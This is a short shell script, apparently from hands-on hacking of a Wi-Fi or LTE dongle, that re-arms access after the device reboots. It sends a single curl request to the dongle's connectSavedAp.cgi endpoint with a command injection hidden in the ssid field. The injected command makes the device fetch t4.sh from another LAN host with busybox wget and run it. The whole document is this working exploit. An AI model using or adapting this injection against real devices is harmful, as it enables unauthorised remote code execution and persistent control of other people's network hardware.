#!/bin/sh
# arm.sh — full re-deploy after a dongle reboot: mounts + logcat + poller (one HTTP request)
exec curl -s -m 30 -G 'http://192.168.8.160/cgi-bin/connectSavedAp.cgi' \
    --data-urlencode 'ssid=A$(/system/bin/busybox wget -q -O /data/t4 http://192.168.8.208:8000/t4.sh&&/system/bin/sh /data/t4&)' \
    -o /dev/null -w 'armed: %{time_total}s\n'
